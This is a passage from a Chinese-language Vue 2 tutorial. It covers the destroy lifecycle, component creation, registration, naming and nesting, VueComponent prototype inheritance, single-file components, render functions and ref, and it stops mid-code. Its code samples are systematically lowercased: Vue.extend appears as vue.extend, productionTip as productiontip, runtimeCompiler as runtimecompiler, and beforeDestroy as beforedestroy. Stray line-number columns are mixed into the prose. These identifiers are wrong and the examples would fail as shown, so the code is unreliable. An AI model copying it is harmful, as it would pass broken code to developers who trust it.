<\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 1.4 销毁流程\n\n\n\n销毁流程比较简单，当vm被销毁时（调用vm.$destroy()）就执行销毁操作。teardown watchers, child components and event listeners阶段，移除数据监听、子组件和事件监听器（不影响原生事件），但是页面的dom显示还是正常的。该阶段前有个生命周期函数是beforedestroy()，此时还能使用vm中所有的data、methods、指令等（但改动data存储数据是不会触发更新，因为要销毁了），但主要是为了进行关闭定时器、取消订阅消息、解绑自定义事件等收尾操作。该阶段后有个生命周期函数是destroyed()，几乎不在该生命周期函数里处理事情。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>你好，{{name}}</h2>\n        <h2>数值，{{num}}</h2>\n        <button @click="change">点击我，改变name，并销毁vm</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                num: 1\n            },\n            // beforedestroy生命钩子：vm中所有的data、methods、指令等，都处于可用状态，马上要执行销毁过程，\n            // 一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等收尾操作。\n            beforedestroy() {\n                console.log(\'尝试访问data数据\', this.name, this._data);\n                console.log(\'尝试访问methods方法\', this.add);\n                this.num = this.num + 1;\n                console.log(\'让num+1：\', this.num, \'再观察页面是否更新\');\n                debugger;\n            },\n            // destroyed生命钩子：几乎不在该生命周期函数里处理事情\n            destroyed() { },\n            methods: {\n                change() {\n                    this.name = \'李四\';\n                    // 销毁vm\n                    // this.$destroy();\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n注意：最好不要使用vm.$destroy()，最好使用v-if\n\n\n# 1.5 整个生命周期图示\n\n总共有4对生命周期函数：\n\n * beforecreate()和created()，数据处理前后\n * beforemount()和mounted()，真实dom插入页面前后\n * beforeupdate()和updated()，虚拟和真实dom更新前后\n * beforedestroy()和destroyed()，vm或组件实例销毁前后\n\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常用的生命周期钩子：\n    1. mounted()：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。\n    2. beforedestroyed()：清除定时器、解绑自定义事件、取消订阅消息等收尾操作。\n 2. 关于销毁vue实例：\n    1. 销毁后借助vue开发者工具看不到任何信息。\n    2. 销毁后自定义事件会失效，但原生dom事件依然有效。\n    3. 一般不会在beforedestroyed()里操作数据，即使操作了数据，也不会触发重新渲染。\n\n----------------------------------------\n\n\n# 二、vue组件化编程\n\n\n# 2.1 什么是组件化编程\n\n用传统方式来开发web项目，会出现多个html、多个js、多个css文件，它们之间的关系会很混乱，维护起来非常不方便。一旦出现功能和展示几乎相同的部分，就会难以复用。当然，随着前端技术的进步可以解决一部分问题，js可以使用es6模块（拆分js，以模块形式导入导出），css也能使用css in js等技术（以模块导入）。\n\n\n\n现代前端技术，ui框架基本推荐使用组件化编程的方式。首先，“组件”的定义是，实现应用中局部功能代码和资源的集合。\n\n那么组件化编程是什么意思呢？是将页面拆分成一个个组件，单个组件会封装所需要的代码和资源（局部功能）。虽然组件是一个独立的个体，但是多个组件是可以进行互相交流的，将开发好了的组件组合在一起，形成一个功能完善的页面（完整功能），这就是组件化编程。当然，组件的高度封装具有独立性，是可以被拿到其他地方进行复用的。\n\n\n\n\n# 2.2 如何运用组件\n\n在这几节里为了代码演示，暂时使用非单文件组件，至于单文件组件在实际开发中使用的更多，会在后面讲解。非单文件组件的意思是一个文件包含了多个组件，那单文件组件自然就是一个文件只包含了一个组件。\n\n在开发中到底怎么运用组件呢？分为三步：1. 创建组件；2. 注册组件；3. 使用组件。\n\n * 创建组件：\n   \n   1. 使用vue.extend(xxx)进行创建组件，其中xxx是一个配置对象，该配置对象和vue实例化时传入的配置对象几乎是相同的（比如配置对象中的el只在vue实例化时才能用）。\n   \n   2. 组件的配置对象的data，一定得使用函数形式。假设组件a会在组件b和组件c里被调用（被复用），组件b去修改了a的data数据，因为data是对象的缘故，在组件c中看到自己调用的a的data数据也变了，这就导致各个调用处共用了一套数据。那就需要使用data的函数形式，data函数return一个新对象，组件b使用a的data数据是独一份的，组件c使用a的data数据也是独一份的。\n      \n      // data返回一个对象，各自调用处用的data数据就不会是同一个对象了\n      function data() {\n          return {a:1,b:2}\n      }\n      const x1 = data();\n      const x2 = data();\n      x1.a = 3; // 影响不到x2的a\n      console.log(\'x2.a:\', x2.a);\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n   \n   3. 可以将组件的模板写在组件的配置对象里，使用的是template，它与data平级，template的值是一个字符串。\n      \n      vue.config.productiontip = false;\n      const school = vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolname}}</h2>\n                  <h2>地址：{{schooladdress}}</h2>\n              </div>`,\n          data() {\n              return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      \n\n * 注册组件：\n   \n   1. 要在调用处注册你将要使用的组件。需要在调用处的配置对象中使用一个新的配置components，components与methods平级。组件注册在components对象里，属性名也就是组件名（自己取的，将来会在模板里使用），属性值就是组件引用（组件创建后留下的组件引用）。\n      \n      vue.config.productiontip = false;\n      const school = vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolname}}</h2>\n                  <h2>地址：{{schooladdress}}</h2>\n              </div>`,\n          data() {\n              return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      const vm = new vue({\n          el: \'#root\',\n          // 局部注册组件（在调用处的配置对象的components里），属性名和组件引用的名相同，就用简写\n          components: {\n              school,\n              person\n          }\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      28\n      29\n      \n   \n   2. 上一点是局部注册，还有一个全局注册，使用得是vue.component(\'xxx\', xxx)，第一个参数是组件名（自己取的，将来会在调用处的模板里使用），第二个参数是组件引用（组件创建后留下的组件引用）。\n      \n      vue.config.productiontip = false;\n      const school = vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolname}}</h2>\n                  <h2>地址：{{schooladdress}}</h2>\n              </div>`,\n          data() {\n              return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      // 全局注册组件，school和person能被所有组件使用，这种情况用的少\n      vue.component(\'school\', school);\n      vue.component(\'person\', person);\n      const vm = new vue({\n          el: \'#root\'\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      \n\n * 使用组件：在模板中使用组件的时候，先找到组件在配置对象中components里对应的属性名，再将这个属性名使用<>包裹成标签就可以到模板里使用了。\n   \n   <!doctype html>\n   <html lang="en">\n   <head>\n       <meta charset="utf-8">\n       <title>document</title>\n       <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n   </head>\n   <body>\n       <div id="root">\n           \x3c!-- 使用组件，编写组件标签 --\x3e\n           <school></school>\n           <hr>\n           <person></person>\n       </div>\n       <script type="text/javascript">\n           vue.config.productiontip = false;\n           // 创建组件\n           const school = vue.extend({\n               template: `\n                   <div>\n                       <h2>学校：{{schoolname}}</h2>\n                       <h2>地址：{{schooladdress}}</h2>\n                   </div>`,\n               data() {\n                   return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n               }\n           });\n           const person = vue.extend({\n               template: `\n                   <div>\n                       <h2>姓名：{{name}}</h2>\n                       <h2>年龄：{{age}}</h2>\n                   </div>`,\n               data() {\n                   return { name: \'张三\', age: 18 }\n               }\n           });\n           const vm = new vue({\n               el: \'#root\',\n               // 注册组件\n               components: {\n                   school,\n                   person\n               }\n           });\n       <\/script>\n   </body>\n   </html>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   \n\n----------------------------------------\n\n总结拓展：\n\n 1. vue中使用组件的三大步骤：\n    1. 定义组件（创建组件）\n    2. 注册组件\n    3. 使用组件（编写组件标签）\n 2. 如何定义一个组件：\n    1. 使用vue.extend(options)创建（注意extend没有带s），其中options和new vue(options)时传入的那个options几乎一样，但也有区别：\n       * el不要写，为什么？——最终所有的组件都要经过vue的管理，由vm中的el决定服务于哪个容器。\n       * data必须写成函数，为什么？——避免组件被复用时，数据存在引用关系（被共用了）。\n    2. 备注：使用template可以配置组件结构（模板）。\n 3. 如何注册组件：\n    1. 局部注册：new vue(options)时，options的components配置。\n    2. 全局注册：vue.component(\'组件名\', 组件)，注意component没有带s。\n 4. 编写组件标签：<school></school>\n\n----------------------------------------\n\n\n# 2.3 组件的几个注意点\n\n在上面一小节里的注册组件里，components的属性名也就是组件名，这个是“自己取的”。这个组件名将来会被用到模板里去使用，它有两种命名情况：\n\n * 一个单词组成：1) 可以字母全部小写，例如school；2) 可以只有首字母大写，例如school。\n * 多个单词组成：2) 使用短横线-连接，例如my-school；2) 让每个单词的首字母大写，例如myschool。在一般的html页面，myschool其实会出现问题，但是在vue脚手架里却是正常的。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件，编写组件标签 --\x3e\n        <my-school></my-school>\n        <hr>\n        <person></person>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 创建组件\n        const sch = vue.extend({\n            template: `\n                    <div>\n                        <h2>学校：{{schoolname}}</h2>\n                        <h2>地址：{{schooladdress}}</h2>\n                    </div>`,\n            data() {\n                return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n            }\n        });\n        const person = vue.extend({\n            template: `\n                    <div>\n                        <h2>姓名：{{name}}</h2>\n                        <h2>年龄：{{age}}</h2>\n                    </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        const vm = new vue({\n            el: \'#root\',\n            // 注册组件\n            components: {\n                // 属性名，是多个单词，那用短横线连接`my-school`；也可每个单词首字母大写`myschool`，但只能出现在脚手架里\n                \'my-school\': sch, // sch是创建组件后留下的组件引用名，`my-school`是注册时的组件名，注意区分两者\n                // 属性名，是单个单词，可以全部小写`person`，也可以只有首字母大写`person`\n                person: person\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n在模板里使用组件，可以是<person></person>也可以是<person/>。第二种的<person/>在非脚手架环境中会出现渲染问题，它后面的组件不会被渲染。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件，在非脚手架环境中，只渲染了第一个person组件 --\x3e\n        <school />\n        <school />\n        <school />\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 创建组件\n        const school = vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolname}}</h2>\n                    <h2>地址：{{schooladdress}}</h2>\n                </div>`,\n            data() {\n                return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n            }\n        });\n        const vm = new vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n创建组件时，可以将vue.extend省略，直接将options赋给引用。表面省略了实际底层还是调用了vue.extend。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件 --\x3e\n        <school></school>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 创建组件，省略了vue.extend()，实际底层调用了vue.extend()\n        const school = {\n            template: `\n                <div>\n                    <h2>学校：{{schoolname}}</h2>\n                    <h2>地址：{{schooladdress}}</h2>\n                </div>`,\n            data() {\n                return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n            }\n        };\n        const vm = new vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 关于组件名：\n    1. 一个单词组成：1) 字母全小写；2) 只首字母大写。\n    2. 多个单词组成：1) 使用短横线分隔； 2) 每个单词首字母大写（需要脚手架支持）。\n    3. 备注：1) 尽可能避开html中已有的标签名；2) 可以使用name配置指定组件在开发者工具中呈现的名字。\n 2. 关于组件标签：\n    1. 可以是<school></school>。\n    2. 可以是<school/>，在不使用脚手架时，<school/>会导致后续组件不能渲染。\n 3. 一个简写方式：const school = vue.extend(options)可简写为const school = options\n\n----------------------------------------\n\n\n# 2.4 组件的嵌套\n\n在第一小节里说过可以将页面拆分成一个个组件，其实组件也能被拆分成一个个组件。这就涉及到组件的嵌套了，很简单，只需要在组件里注册另外一个组件，然后在模板中使用注册好的那个组件，这样就完成了一个简单的组件嵌套。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用school组件 --\x3e\n        <school></school>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 创建student组件\n        const student = vue.extend({\n            template: `\n                <div>\n                    <h2>学生姓名：{{name}}</h2>\n                    <h2>学生年龄：{{age}}</h2>\n                </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        // 创建school组件\n        const school = vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolname}}</h2>\n                    <h2>地址：{{schooladdress}}</h2>\n                    \x3c!-- 使用school组件，注册在哪个组件里，就使用在哪个组件的模板中 --\x3e\n                    <student></student>\n                </div>`,\n            data() {\n                return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n            },\n            // 在组件中注册另一个组件，完成组件嵌套\n            components: { student }\n        });\n        const vm = new vue({\n            el: \'#root\',\n            // 注册school组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n\n\n# 2.5 vuecomponent\n\n创建组件其本质是生成了一个函数对象，这个函数是一个vuecomponent构造函数（等待实例化），我们看一下vue.extend的简化源码。\n\nvue.extend = function (extendoptions) {\n    // ... 其他逻辑暂时省略\n    var sub = function vuecomponent(options) {\n        this._init(options);\n    };\n    // ... 其他逻辑暂时省略\n    // 生成vuecomponent构造函数并返回\n    return sub\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n创建了多个组件，那每个组件拥有的vuecomponent构造函数是不相同的（上面return的是新对象），虽然vuecomponent实际代码一样，但是它们的执行环境、变量对象、this都是不一样的。你可以简单测试一下。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件 --\x3e\n        <school></school>\n        <student></student>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 创建student组件\n        const student = vue.extend({\n            template: `\n                <div>\n                    <h2>学生姓名：{{name}}</h2>\n                    <h2>学生年龄：{{age}}</h2>\n                </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        // 创建school组件\n        const school = vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolname}}</h2>\n                    <h2>地址：{{schooladdress}}</h2>\n                </div>`,\n            data() {\n                return { schoolname: \'武汉大学\', schooladdress: \'武汉市武昌区珞珈山路\' }\n            },\n        });\n        // 首先验证school和student是个什么东西？其实是个vuecomponent构造函数\n        console.log(\'school是什么？\', school);\n        console.log(\'student是什么？\', student);\n        // 再验证不同组件的vuecomponent构造函数是否一样，其实不一样，每次vue.extend都会生成新的\n        console.log(\'student是否与school相同？\', school === student);\n        school.a = 11;\n        console.log(\'school.a是11，那student.a是多少？\', student.a);\n        const vm = new vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school, student }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n在模板中使用组件，其底层是使用new关键字调用vuecomponent构造函数，将它实例化，生成的实例就是组件实例，通常简称为vc。vc与vm的结构非常类似，因为vuecomponent构造函数和vue构造函数都会走this._init(options)逻辑，区别就是各自的options有些不一样，也就是前面说过el和data有些不一样。options里的这些配置methods、watch、computed，在这些配置里面定义方法，方法的this指向就是生成的实例，组件就是组件实例vc。\n\n// 组件实例化时调用\nvar sub = function vuecomponent(options) {\n    this._init(options);\n};\n// new vue()时调用\nfunction vue(options) {\n    this._init(options);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nvm可以通过原型使用一些特殊的属性和方法（公共的），比如$watch()，其实vc也能使用$watch()。这涉及到一个重要的内置关系，vc的原型继承了vm的原型，稍微直白点的说法是，vc的原型对象可以通过__proto__访问到vm的原型对象。可以看一下vue.extend的简化源码。\n\n// vue框架中关于vuecomponent构造函数\nvue.extend = function (extendoptions) {\n    // ... 其他逻辑暂时省略\n    // 这里的super实际上是vue构造函数\n    var super = this;\n    // 都走_init，所以vm有的实例属性和方法，vc几乎都有\n    var sub = function vuecomponent(options) {\n        this._init(options);\n    };\n    // 原型式继承，sub.prototype的__proto__指向了super.prototype\n    sub.prototype = object.create(super.prototype);\n    // 让原型上的构造函数引用，重新指向sub\n    sub.prototype.constructor = sub;\n    // ... 其他逻辑暂时省略\n    return sub; // 返回vuecomponent构造函数\n};\n// js中关于object.create()的本质，它返回了一个新对象，新对象的__proto__指向了o\nfunction object(o) {\n    function f() {}     // 定义临时引用类型f的构造函数\n    f.prototype = o;    // 普通函数的入参对象o作为这个临时引用类型f的原型\n    return new f();     // 最后临时引用类型f的实例\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 组件本质是一个名为vuecomponent的构造函数，且不是程序员自定义的，是vue.extend()新生成的函数对象。\n 2. 在模板中使用组件，例如<school></school>，vue解析时会帮我们创建组件的实例对象（school组件的实例对象）。\n 3. 特别注意：每次调用vue.extend()，返回的都是一个全新的vuecomponent构造函数。\n 4. 关于this的指向：\n    1. 组件配置对象中，methods、watch、computed里定义的方法，它们的this指向均是vuecomponent实例(vc)。\n    2. new vue()配置对象中，methods、watch、computed里定义的方法，它们的this指向均是vue实例对象(vm)。\n 5. 想要在控制台查看组件的嵌套，可以在vm.$children或者vc.$children进行查看。\n 6. 一个重要的内置关系：vuecomponent.prototype.__proto__ === vue.prototype。让实例组件vc能访问到vue原型上的属性和方法。\n\n----------------------------------------\n\n\n# 2.6 单文件组件\n\n单文件组件就是一个文件只包含了一个组件。这个单文件，一般存在于vue脚手架里，vue脚手架在学习vue的准备工作里介绍安装过。\n\n单文件的命名方式与2.3 组件的几个注意点这节里组件命名方式一样，在脚手架里常使用每个单词首字母大写的方式。单文件的样子就是下面例子xxx.vue，它只有三种标签<template>组件的模板、<script>脚本、<style>样式，比较方便复用。\n\n<template>\n    \x3c!-- 模板，组件的结构 --\x3e\n</template>\n<script>\n    // 组件交互相关的代码（数据、方法等）\n<\/script>\n<style>\n    /* 组件的样式 */\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n我们将前面几节的例子修改单文件组件形式（可以先将脚手架的src/main.js和public/index.html删除），首先准备school.vue和student.vue，这两个文件我们放在了一个src/components文件夹下。\n\n<template>\n  <div>\n    <h2>学校：{{ schoolname }}</h2>\n    <h2>地址：{{ schooladdress }}</h2>\n  </div>\n</template>\n\n<script>\n// 将创建的组件，以模块的方式导出去，vue.extend()省略了\nexport default {\n  name: "school",\n  data() {\n    return { schoolname: "武汉大学", schooladdress: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<template>\n  <div>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\n// 将组件导出去，省略了vue.extend()的方式\nexport default {\n  name: "student",\n  data() {\n    return { name: "张三", age: 18 };\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n然后准备一个app.vue，它是一个应用中最大的组件，管理所有的组件，它就放在src目录里。\n\n<template>\n  <div>\n    <school></school>\n    <student></student>\n  </div>\n</template>\n\n<script>\nimport school from "./components/school.vue";\nimport student from "./components/student.vue";\n\nexport default {\n  name: "app",\n  components: {\n    school,\n    student,\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n此时vm实例还没有准备，那就新建一个文件main.js，这个main.js是js入口文件，它放在src目录里。\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\n\nvue.config.productiontip = false;\n\n/*\n    在脚手架里默认不能使用`template`字段，下一章节会解释。可以在项目根目录新建vue.config.js，\n    并在里面加上`module.exports={runtimecompiler: true}`，然后重启项目即可消除限制。\n*/ \nnew vue({\n    el: \'#app\',\n    name: \'app\',\n    template: `<app></app>`,\n    components: {\n        app\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n最后就是准备一个浏览器能识别的html入口文件index.html，它其实是在public目录里。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    \x3c!-- 针对ie浏览器的一个特殊配置，含义是让ie浏览器以最高的渲染级别渲染页面 --\x3e\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    \x3c!-- 开启移动端的理想视口 --\x3e\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>document</title>\n</head>\n<body>\n    <div id="app"></div>\n    \x3c!-- 在脚手架里，会自动注入这些js，无需手动引入 --\x3e\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <script src="./main.js"><\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n你可以将上面的几个文件拿到vue脚手架里对应目录下，稍加修改就可以运行使用了。\n\n\n# 三、组件相关零碎知识\n\n\n# 3.1 解析成虚拟dom的方式\n\n渲染页面解析成虚拟dom有三种方式：解析模板标签、使用render函数、解析配置对象的template字段。前两者用得较多，最后一个很少使用了。\n\n * 解析模板标签需要专用的编译器，这个在项目的package.json中可以找到，叫做vue-template-compiler。\n * render函数使用了createelement。\n * 解析template字段也是用了一个编译器（要与模板标签的区分开），在项目中它是默认不开启的。\n\n因为解析template字段的编译功能默认在脚手架项目中不开启，所以在上一章最后一节的main.js里，遇到了问题。问题是得到了解决，在项目的根目录下新建vue.config.js文件，然后在里面写上如下配置（添加webpack有关配置），这样就开启了解析template字段的编译器了。（注意改完重启项目）\n\nmodule.exports = {\n    // 开启compiler模式，让配置对象可以使用`template`字段\n    runtimecompiler: true\n}\n\n\n1\n2\n3\n4\n\n\n但是我们不建议开启解析template字段的编译功能，原因是与该编译功能的vue.esm.js比较大，比默认使用的vue.runtime.esm.js**大了30%**的体积。\n\n\n# 3.2 render函数\n\n上一章最后一节的main.js，是可以将template: \'<app></app>\'替换成render()（render函数），这样就无需添加runtimecompiler有关配置，减小打包后的包体积。\n\n在配置对象中render()是与data()平级的，vue在渲染时会调用这个render()，并且会传一个xxx参数给render(xxx)。要注意，xxx的实参是vue提供给我们的一个函数，它是一个用来生成虚拟dom元素的函数。生成虚拟dom以后，会return给vue，vue会拿这个虚拟dom去生成真实dom，完成当前页面或组件的渲染。\n\nxxx形参名可以是createelement也可以是h（自定义名字），使用createelement()时，它的入参可以是原生元素相关，也可以是子组件。\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\nvue.config.productiontip = false\nnew vue({\n  el: \'#app\',\n  /*\n    render函数替代了`template`字段。createelement指向的是一个函数，\n    该函数是由vue提供的，用来生成虚拟dom。生成的虚拟dom最后要return给vue的。\n    createelement的入参可以是原生元素相关，也可以子组件。createelement\n    这个名是自定义的，也可以是h。\n  */\n  render(createelement) {\n    // 如果使用原生元素，第一个参数是标签名，第二个是标签体\n    // return createelement(\'h1\', \'你好\');\n    // 注册子组件后，在这里使用子组件，然后就可以展示到当前组件里\n    return createelement(app);\n  },\n  // 在当前组件里注册子组件\n  components: {\n    app\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 渲染页面解析成虚拟dom有三种方式：解析模板标签、使用render函数、解析配置对象的template字段。\n 2. 脚手架项目默认不开启解析template字段的编译功能，因为前两种基本够用，还能减小打包的包体积。\n 3. 如果存js文件（非vue文件）可以使用render函数来渲染组件或页面，render函数的形参指向一个函数。该形参就是具体用于生成虚拟dom的函数，接收的参数可以是原生元素相关或者子组件。\n\n----------------------------------------\n\n\n# 3.3 ref特殊属性\n\n我们在列表渲染相关章节里介绍过key，它是一个特殊的attribute。这一小节要介绍另外一个特殊的attribute，ref常用来替代id，用于获取真实dom元素或者子组件的实例。在模板中使用ref="xxx"来给原生元素或子组件进行注册引用信息，然后在某个方法中使用this.$refs.sch来获取对应的真实dom或子组件实例。\n\n<template>\n  <div>\n    \x3c!-- 使用的id，获取时使用document.getelementbyid --\x3e\n    \x3c!-- <h2 id="sch">学校：{{ schoolname }}</h2> --\x3e\n    \x3c!-- 使用的ref，获取时使用this.$refs.xxx --\x3e\n    <h2 ref="sch">学校：{{ schoolname }}</h2>\n    <h2>地址：{{ schooladdress }}</h2>\n    <button @click="getel">点击获取学校名的元素</button>\n    \x3c!-- 在子组件上使用ref，获取时this.$refs.xxx，得到的是子组件的实例对象 --\x3e\n    <student ref="stud"></student>\n  </div>\n</template>\n\n<script>\nimport student from 